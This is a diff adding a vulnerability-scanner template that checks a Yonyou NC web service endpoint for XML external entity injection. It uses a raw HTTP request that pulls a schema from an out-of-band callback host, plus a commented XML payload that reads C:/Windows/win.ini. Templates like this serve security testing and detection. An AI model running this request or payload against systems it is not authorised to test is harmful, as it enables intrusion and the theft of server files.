@@ -1,0 +1,44 @@
+
+id: nc-itf-tb-oba-XXE
+
+info:
+  name: msk-template
+  author: msk
+  severity: high
+
+
+
+http:
+  - raw:
+      - |
+        GET /uapws/service/nc.itf.tb.oba.INtbOBAWebService?xsd=http://{{interactsh-url}}/win2.xml HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+        Connection: close
+        Accept: text/plain, */*; q=0.01
+        Cache-Control: no-cache
+        Pragma: no-cache
+        Accept-Encoding: gzip
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"[f")
+
+
+
+# <?xml version="1.0" encoding="UTF-8"?>
+# <!DOCTYPE data [
+#   <!ENTITY winIni SYSTEM "file:///C:/Windows/win.ini">
+# ]>
+# <data>
+#   <content>&winIni;</content>
+# </data>
